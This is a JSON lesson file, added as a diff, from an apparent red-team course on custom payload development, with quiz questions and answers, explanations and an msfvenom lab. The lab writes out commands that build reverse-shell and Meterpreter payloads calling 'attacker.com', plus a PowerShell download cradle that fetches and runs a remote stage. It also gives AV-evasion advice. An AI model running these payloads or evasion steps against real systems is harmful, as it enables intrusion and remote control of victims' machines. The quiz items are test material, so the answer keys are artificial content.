@@ -1,0 +1,109 @@
+{
+  "lesson_id": "b8c9d0e1-f2a3-4b4c-5d6e-7f8a9b0c1d2e",
+  "domain": "red_team",
+  "title": "Custom Payload Development",
+  "difficulty": 2,
+  "order_index": 39,
+  "prerequisites": ["Building PowerShell Payloads"],
+  "concepts": ["Payload delivery mechanisms and stages", "Shellcode generation and encoding", "Obfuscation techniques for evasion", "AV bypass strategies and limitations", "Payload testing and validation methodology"],
+  "estimated_time": 55,
+  "learning_objectives": [
+    "Understand payload architecture including stagers, payloads, and delivery mechanisms",
+    "Generate custom payloads using msfvenom and manual shellcode techniques",
+    "Apply encoding, encryption, and obfuscation to reduce detection signatures",
+    "Evaluate antivirus bypass strategies and understand their limitations",
+    "Implement safe payload testing methodologies in isolated environments"
+  ],
+  "post_assessment": [
+    {
+      "question": "What is the difference between a stager and a stage in payload architecture?",
+      "options": [
+        "A stager is the main payload, a stage is the delivery mechanism",
+        "A stager is a small initial payload that downloads and executes a larger stage",
+        "Stagers only work on Windows, stages work on all platforms",
+        "There is no difference — they are interchangeable terms"
+      ],
+      "correct_answer": "A stager is a small initial payload that downloads and executes a larger stage",
+      "explanation": "A stager is a compact initial payload whose only job is to connect back and download the larger stage (the main payload). This two-stage approach keeps the initial footprint small and allows the main payload to be modified on the server side without regenerating the stager. The stager typically uses a simple protocol like TCP or HTTP to fetch the stage."
+    },
+    {
+      "question": "Why does encoding a payload with msfvenom -e (e.g., shikata_ga_nai) NOT reliably evade modern antivirus?",
+      "options": [
+        "Encoding is only for Windows payloads",
+        "Modern AV uses behavioral analysis, heuristic scanning, and AMSI that detect the decoded payload at runtime regardless of encoding",
+        "msfvenom encoding is broken and doesn't work at all",
+        "Encoding only works with staged payloads"
+      ],
+      "correct_answer": "Modern AV uses behavioral analysis, heuristic scanning, and AMSI that detect the decoded payload at runtime regardless of encoding",
+      "explanation": "Encoding (like shikata_ga_nai) modifies the payload's byte signature to evade static signature detection. However, modern AV doesn't rely solely on static signatures — it uses behavioral analysis (watching what the payload does when executed), heuristic scanning, and in the case of PowerShell, AMSI (which sees the decoded content). The payload must be decoded before execution, and that's when behavioral detection catches it."
+    },
+    {
+      "question": "Which payload delivery method provides the most flexibility for changing the final payload after initial delivery?",
+      "options": [
+        "Embedded single-stage payload",
+        "Staged payload with remote fetch",
+        "Encoded payload in a macro",
+        "Base64-encoded PowerShell command"
+      ],
+      "correct_answer": "Staged payload with remote fetch",
+      "explanation": "A staged payload (stager + stage) allows you to modify the stage (main payload) on the C2 server at any time without re-delivering the stager. The stager simply connects back and downloads whatever is currently served. This means you can change payloads, switch between reverse shell and Meterpreter, or even deliver different payloads to different targets — all without modifying the initial delivery mechanism."
+    },
+    {
+      "question": "What is the primary purpose of a payload's 'sleep' or 'jitter' parameter in C2 frameworks?",
+      "options": [
+        "To reduce CPU usage on the target",
+        "To add randomness to callback intervals, making C2 traffic harder to distinguish from normal network behavior",
+        "To encrypt the payload during transit",
+        "To compress the payload to reduce network bandwidth"
+      ],
+      "correct_answer": "To add randomness to callback intervals, making C2 traffic harder to distinguish from normal network behavior",
+      "explanation": "C2 communication at regular intervals (e.g., every 60 seconds) creates a detectable pattern. Jitter adds randomness (e.g., 60 seconds ± 20%) so callbacks occur at irregular intervals, making the traffic look more like normal user browsing behavior and harder for network detection tools to flag."
+    }
+  ],
+  "jim_kwik_principles": ["Visualization", "Association", "Emotion", "Storytelling", "Repetition", "Chunking", "Active Recall", "Mnemonics", "Teach Back", "Curiosity"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Payloads Are Not Just for Script Kiddies",
+      "content": "There's a misconception that 'real hackers' write everything from scratch and only script kiddies use tools like msfvenom. The reality: every professional red teamer uses payload generators as a starting point, then customizes heavily. The skill isn't in avoiding tools — it's in understanding what the tool generates, how detection works, and how to adapt payloads for specific environments. This lesson teaches you the fundamentals of payload architecture so you understand what you're creating, why it's detected, and what your options are. This knowledge makes you both a better operator and a better defender."
+    },
+    {
+      "type": "explanation",
+      "title": "Payload Architecture: Stagers, Stages, and Delivery",
+      "content": "Modern payloads use a multi-stage architecture for flexibility, stealth, and operational security:\n\n**Stager (Stage 0):** A small, compact payload whose only job is to connect back to the C2 server and download the main payload. Stagers are typically 200-500 bytes, making them easier to embed in exploits with size constraints. They use simple protocols (TCP, HTTP, HTTPS) to fetch the stage.\n\n**Stage (Stage 1+):** The main payload that provides full functionality — shell, Meterpreter, custom C2 client, etc. Stages can be large (tens of KB) and include full-featured post-exploitation capabilities.\n\n**Why staging matters:**\n1. Small initial footprint — easier to fit in exploit buffers and evade size-based detection\n2. Payload flexibility — change the stage on the server without re-delivering the stager\n3. Operational security — the main payload is never stored on disk, only in memory\n4. Multiple protocols — stagers can try HTTP first, fall back to DNS if blocked\n\n**Payload formats:**\n- Raw shellcode (position-independent code, directly executable in memory)\n- Executables (.exe, .dll, .elf, .bin)\n- Script payloads (PowerShell, Python, Bash)\n- Document-embedded (macros, DDE, OLE)\n- Web-delivered (HTA, VBA, JavaScript)\n\n**msfvenom basics:**\n`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe -o payload.exe`\n`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf`\n`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f ps1 -o payload.ps1`"
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Payloads Are Like Delivery Packages",
+      "content": "Imagine you need to send a big, complicated robot (the payload) to a friend's house, but the robot is too big to fit through the mail slot.\n\n**Stagers are like a tiny key** that you send first. The key is small enough to fit through the mail slot. Once it arrives, it opens a secret tunnel to your house, and then the big robot walks through the tunnel to your friend's house. The key (stager) is small and simple — its only job is to set up the tunnel.\n\n**Stages are the big robot** that comes through the tunnel. It has all the cool features — cameras, tools, remote control. Because it comes through the tunnel (network), it never has to fit through the tiny mail slot.\n\n**Encoding is like wrapping the robot in different paper.** The robot inside is exactly the same, but the wrapping looks different each time. If the security guard (antivirus) knows what 'robot-shaped wrapping' looks like, they'll catch it. So you change the wrapping paper pattern. But here's the catch — when the robot unwraps itself to start working, the guard can see it! That's why encoding alone doesn't fool modern security.\n\n**Obfuscation is like disguising the robot's instructions.** Instead of saying 'walk to the door,' you say 'take three steps forward, then rotate 90 degrees left, then take one step forward' — the robot ends up at the same door, but the instructions look completely different.\n\n**The lesson:** No disguise is perfect. The best approach is to use a disguise that's good enough to get past the initial checkpoint, and then be clever about what you do once you're inside."
+    },
+    {
+      "type": "code_exercise",
+      "title": "Payload Generation and Customization Lab",
+      "content": "Practice generating and customizing payloads with msfvenom and manual techniques:\n\n# 1. List available payloads\nmsfvenom --list payloads | grep windows/x64\nmsfvenom --list payloads | grep linux/x64\n\n# 2. Generate basic payloads\n# Windows reverse HTTPS Meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f exe -o /tmp/payload.exe\n\n# Linux reverse TCP shell\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell.elf\n\n# PowerShell payload\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f ps1 -o /tmp/payload.ps1\n\n# 3. Encoding (reduces static signatures, not behavioral)\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -e x64/zutto_dekiru -i 3 -f exe -o /tmp/encoded.exe\n\n# 4. Custom payload with msfvenom templates and injection\n# Generate raw shellcode first\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f raw -o /tmp/shellcode.bin\n\n# 5. PowerShell download cradle with custom payload\n# Generate staged payload\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f ps1\n\n# 6. Combine with custom PowerShell wrapper\n# Create a launcher that bypasses execution policy\n# powershell -NoProfile -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage.ps1')\"\n\n# 7. Generate payload for specific formats\n# HTA (HTML Application)\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f hta-psh -o /tmp/payload.hta\n\n# VBA macro\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f vba-psh\n\n# 8. Payload analysis — understand what you're generating\n# Examine raw shellcode\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | xxd | head -20\n\n# Check payload size\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe | wc -c",
+      "code": "# List payloads\nmsfvenom --list payloads | grep windows/x64\n\n# Generate Windows reverse HTTPS payload\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f exe -o payload.exe\n\n# Generate with encoding\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -e x64/zutto_dekiru -i 3 -f exe -o encoded.exe\n\n# Generate raw shellcode\nmsfvenom -p windows/x64/meterpreter/reverse_https \\\n  LHOST=attacker.com LPORT=443 -f raw -o shellcode.bin",
+      "language": "bash"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World: How APT Groups Build Custom Payloads",
+      "content": "Advanced Persistent Threat groups don't use msfvenom payloads off the shelf. They invest significant effort in custom payload development to evade enterprise detection. Here's how different APTs approach payload construction:\n\n**APT29 (Cozy Bear):** Uses custom DLL side-loading chains. Their payloads are loaded by legitimate, signed binaries (like svchost.exe or rundll32.exe) with hijacked DLL search order. The legitimate binary loads the malicious DLL, giving the payload a trusted execution context.\n\n**APT28 (Fancy Bear):** Employs custom compile-time obfuscation frameworks. Their Go-based payloads use garble (a Go obfuscator) to randomize function names, string literals, and control flow. They also embed valid code-signing certificates stolen from legitimate vendors.\n\n**FIN7:** Uses custom JavaScript and .NET loaders with multi-layer decryption. Their payloads are delivered as obfuscated JavaScript in .lnk files that decrypt and execute shellcode through multiple layers (typically 3-5 layers of decryption).\n\n**Common evasion techniques observed:**\n1. **Execution flow flattening** — Reorganizing code blocks with switch statements to defeat static analysis\n2. **API hashing** — Resolving Windows APIs by hash instead of name to avoid Import Address Table detection\n3. **Sleep obfuscation** — Encrypting payload memory during sleep periods to evade memory scanners\n4. **Environment checks** — Checking for VMs, sandboxes, and analysis tools before executing\n5. **Living-off-the-Land** — Using legitimate Windows tools (PowerShell, certutil, mshta) instead of custom binaries\n\n**The lesson:** Professional payloads avoid detection through deep understanding of how AV/EDR works — not through any single technique, but through a combination of architecture choices, delivery methods, and runtime behaviors that reduce detection surface."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Payload Evasion: The SLEPT Mnemonic",
+      "content": "**S** — Staging: Use multi-stage payloads to keep initial footprint small\n**L** — Layering: Multiple layers of encoding/encryption (but don't rely on encoding alone)\n**E** — Environment checks: Detect VMs, sandboxes, and analysis tools\n**P** — Protocol blending: Use HTTPS, DNS, or common cloud APIs for C2\n**T** — Timing: Add jitter and realistic sleep intervals to C2 callbacks\n\n**Detection layers you must consider:**\n- Static analysis (file hashes, signatures, YARA rules)\n- Dynamic analysis (sandbox execution, behavior monitoring)\n- AMSI (PowerShell/.NET script content scanning)\n- EDR (process behavior, memory scanning, ETW)\n- Network analysis (C2 traffic patterns, beaconing detection)\n- Host-based (Sysmon, command-line logging)\n\n**Key principle:** No single evasion technique is sufficient. Defense works in layers, so evasion must also work in layers. The goal is not to be invisible, but to reduce detection surface enough to blend in with legitimate activity."
+    },
+    {
+      "type": "reflection",
+      "title": "Payload Development Ethics and Safety",
+      "content": "Before moving on, consider these important questions about payload development:\n\n1. Why is testing payloads only in isolated lab environments critical? What could go wrong if you test in a production network?\n\n2. A colleague suggests using a payload that exploits a zero-day vulnerability in a production environment to 'test detection.' What's wrong with this approach?\n\n3. You've built a custom payload that successfully evades your organization's EDR. Should you share this technique publicly? What are the considerations?\n\n4. What's the difference between encoding, encryption, and obfuscation in the context of payload development?\n\nAnswers: (1) Malicious payloads can spread beyond the intended target, trigger defensive systems, or cause unintended damage. Always use isolated networks with no connection to production or the internet. (2) Zero-day exploits can cause instability, crashes, or unintended side effects on production systems. Use known-vulnerable test systems in a lab instead. (3) Responsible disclosure principles apply — sharing defensive evasion techniques can help both red and blue teams, but timing and context matter. Coordinate with your organization's policy. (4) Encoding changes the byte representation (like Base64) but is trivially reversible. Encryption requires a key to reverse and is much harder for defenders to analyze. Obfuscation changes the code structure to make analysis difficult (variable renaming, control flow flattening) but doesn't require a key."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Understanding Payloads Makes You a Better Defender",
+      "content": "You've learned the fundamentals of payload architecture, generation, and evasion. The key insight: payloads are detected at multiple layers (static, dynamic, behavioral, network), and evasion must address each layer. No single technique is sufficient. As a red teamer, your goal is to reduce detection surface enough to achieve the objective — not to be invisible. As a blue teamer, understanding these techniques helps you build detections that catch evasion attempts at multiple points. The cat-and-mouse game between payload developers and defenders is ongoing, and the professionals on both sides are the ones who understand the other's perspective deeply."
+    }
+  ],
+  "tags": ["Course: SANS-SEC467", "Career Path: Red Teamer", "Career Path: Pentester"]
+}
